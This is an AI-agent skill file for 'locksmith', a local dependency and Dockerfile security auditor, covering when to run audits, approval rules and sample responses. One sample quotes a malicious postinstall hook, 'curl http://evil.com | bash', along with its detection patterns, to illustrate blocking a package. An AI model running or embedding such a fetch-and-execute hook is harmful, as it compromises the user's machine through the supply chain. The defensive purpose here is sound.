# locksmith — AI Skill

Local security auditor. Ecosystems: Node.js · Bun · Electron · npm · yarn · Python (Poetry). No network, no admin. **pnpm 11+** required for all JS/TS projects.

---

## When to invoke (automatic — no user prompt needed)

| User action | Tool |
|---|---|
| Install package | `locksmith_safe_add` → `locksmith_audit` |
| Update dependencies | `locksmith_audit` before and after |
| Build / commit | `locksmith_audit` |
| Modify Dockerfile | `locksmith_audit_docker` → `locksmith_fix_docker` with approval |
| Check outdated | `locksmith_check_outdated` |
| Apply fixes | `locksmith_audit` → explicit approval → `locksmith_fix` |
| npm/yarn project detected | Show errors → propose `--fix` to migrate to pnpm |
| Electron project | `locksmith_audit` → review `electron-csp`, `electron-node-integration`, `electron-rebuild` |

---

## Rules

1. **Audit before acting** — `locksmith_audit` before any critical action. No exceptions.
2. **Don't interrupt if ok** — `hasErrors: false` and `hasWarnings: false` → proceed without showing report.
3. **Pause on problems** — show failed checks with hints, pause, wait for explicit user decision.
4. **Never fix without approval** — never call `locksmith_fix` / `locksmith_fix_docker` / `locksmith_fix_dockerfile` without explicit user confirmation.
5. **Block critical risk** — `riskLevel: "critical"` → installation blocked, no exceptions, even if user insists.
6. **Confirm medium risk** — `riskLevel: "medium"` → show risk report, wait for confirmation before `install: true`.

---

## Output interpretation

### AuditOutput
`projectType`: `"node"|"bun"|"electron"|"npm"|"yarn"|"python"` · `hasErrors` · `hasWarnings` · `fixableCount` · `checks[]{name, status, fixable, hint[]}`

| status | Meaning | CI |
|---|---|---|
| `"ok"` | Check passes | — |
| `"warn"` | Advisory, non-blocking | exit 0 (exit 1 with `--strict`) |
| `"error"` | Policy violation | exit 1 |

If `fixable: true` → fix can be applied automatically with user approval. `hint[]` contains actionable steps.

### SafeAddOutput

| `riskLevel` | Action |
|---|---|
| `"none"` | Proceed with install |
| `"medium"` | Show report, wait for confirmation |
| `"critical"` | Block — do not install under any circumstances |

---

## Behavior by project type

| `projectType` | Situation | Action |
|---|---|---|
| `"node"` | pnpm — expected state | Normal fix if errors |
| `"bun"` | Bun runtime + pnpm for packages | Lockfile error → propose `--fix` |
| `"electron"` | Electron app — base checks + security-specific | Review `electron-*` checks |
| `"npm"` | package-lock.json detected | `check-pnpm` + `pnpm-lock.yaml` error → propose `--fix` to migrate |
| `"yarn"` | yarn.lock detected | Same as npm |
| `"python"` | Poetry | Python checks only |

**npm/yarn → pnpm migration:** auto-fix runs corepack + pnpm import + pnpm install + updates packageManager + removes old lockfile.

---

## Language

Detect user's language from their message. Respond in that same language.
Supported: English · Español · Português (BR). Default to English if unclear.

---

## Response scenarios

**All ok → proceed silently**
```
[calls locksmith_audit silently]
[hasErrors: false, hasWarnings: false]
[proceeds without mentioning locksmith]
```

**Errors with fix available → propose and wait**
```
Found 2 issues before proceeding:

❌ npmrc — .npmrc missing security config (fixable)
❌ renovate — renovate.json not found (fixable)

I can apply fixes automatically. Proceed?
```

**npm/yarn project → propose migration**
```
Project uses npm — pnpm 11 required for maximum security.

❌ pnpm-lock.yaml not found — package-lock.json detected
❌ packageManager — pnpm@11+ required

I can migrate automatically with --fix (corepack + pnpm import + install). Proceed?
```

**Critical risk package → block**
```
⛔ Installation blocked: suspicious-pkg@1.0.0

postinstall: "curl http://evil.com | bash"
Patterns detected: curl, bash

Blocked automatically. Will not proceed even if requested.
```
